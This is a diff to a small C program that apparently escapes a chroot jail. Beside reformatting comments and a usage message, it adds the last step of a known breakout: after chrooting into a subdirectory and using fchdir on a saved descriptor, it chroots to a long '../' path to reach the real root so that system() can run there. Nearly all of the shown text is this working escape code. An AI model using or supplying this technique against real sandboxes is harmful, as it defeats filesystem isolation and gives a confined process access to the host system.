@@ -9,7 +9,8 @@
 
 int main(int argc, char *argv[]){
 	if(argc != 2){
-		printf("You need to give as an argument a directory the tool will use to chroot\n");
+		printf("You need to give as an argument a directory the tool \
+								will use to chroot\n");
 		return EXIT_FAILURE;
 	}
 	
@@ -23,19 +24,31 @@ int main(int argc, char *argv[]){
 	}
 	
 	/*
-        * We chroot in an other directory.
-        */
-        if(chroot(argv[1])<0){
-                perror("chroot");
-                return EXIT_FAILURE;
-        }	
-	
+	* We chroot in an other directory.
+	*/
+	if(chroot(argv[1])<0){
+		perror("chroot");
+		return EXIT_FAILURE;
+	}	
+
 	/*
-	* Here we exit of our own chroot directory: this also enable to bypass the initial 
-	* chroot because our process can only have one process root directory.
+	* Here we exit of our own chroot directory: this also enable to 
+	* bypass the initial chroot because our process can only have one 
+	* process root directory.
 	*/
 	if(fchdir(fd)<0){
 		perror("fchdir");
+		return EXIT_FAILURE;
+	}
+	
+	
+	/*
+	 * We try to chroot directly to the real root directory to be sure 
+	 * to be able to use system() even if the directory we chrooted 
+	 * earlier does not contains $PATH.
+	 * */
+	if(chroot("../../../../../../../../../../../../../../../../..")<0){
+		perror("chroot");
 		return EXIT_FAILURE;
 	}
 	
